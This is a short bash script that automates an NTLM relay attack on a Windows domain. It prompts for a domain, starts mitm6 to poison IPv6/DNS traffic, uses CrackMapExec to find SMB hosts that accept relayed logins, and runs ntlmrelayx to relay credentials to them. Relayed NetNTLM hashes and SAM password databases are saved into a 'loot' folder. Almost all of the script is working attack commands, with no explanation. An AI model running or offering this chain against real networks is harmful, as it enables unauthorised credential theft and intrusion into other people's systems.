echo $(hostname -A) "is the hostname."
ip=$(hostname -I)
echo
echo "Enter domain you want to test (i.e: example.local)"
read domain
echo
gnome-terminal --tab -e "bash -c 'mitm6 -i eth0 -d $domain; bash'"
echo
echo
echo "Looking for vulnerable hosts"
cme smb hosts/targets.txt --gen-relay-list hosts/relayable.txt
echo $(cat hosts/relayable.txt |wc -l) "hosts found"
ntlmrelayx.py -6 -wh $ip -of loot/netntlm_dump -l loot/sam_dump -tf hosts/relayable.txt